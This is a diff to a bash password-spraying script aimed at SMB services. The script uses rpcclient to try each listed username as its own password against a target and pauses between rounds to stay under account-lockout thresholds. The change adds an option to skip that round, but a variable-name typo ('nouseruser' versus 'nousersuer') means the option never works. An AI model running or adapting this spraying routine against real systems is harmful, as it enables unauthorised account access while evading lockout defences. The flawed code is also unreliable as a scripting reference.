@@ -110,6 +110,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     mkdir -p logs
     set +H
     domain=$7
+    nouseruser=$8
     target=$2
     cp $3 logs/username-removed-successes.txt
     userslist="logs/username-removed-successes.txt"
@@ -120,16 +121,18 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     touch logs/spray-logs.txt
 
     #Initial spray for same username as password
-    time=$(date +%H:%M:%S)
-    echo "$time Spraying with password: Users Username"
-    for u in $(cat $userslist); do 
-    	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
-    done
-    cat logs/spray-logs.txt | grep -v "Cannot"
-    counter=$(($counter + 1))
-    if [ $counter -eq $lockout ] ; then
-    	counter=0
-    	sleep $lockoutduration
+    if [ "$nousersuer" == "" ] ; then
+        time=$(date +%H:%M:%S)
+        echo "$time Spraying with password: Users Username"
+        for u in $(cat $userslist); do 
+        	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
+        done
+        cat logs/spray-logs.txt | grep -v "Cannot"
+        counter=$(($counter + 1))
+        if [ $counter -eq $lockout ] ; then
+        	counter=0
+        	sleep $lockoutduration
+	fi
     fi
 
     #Then start on list
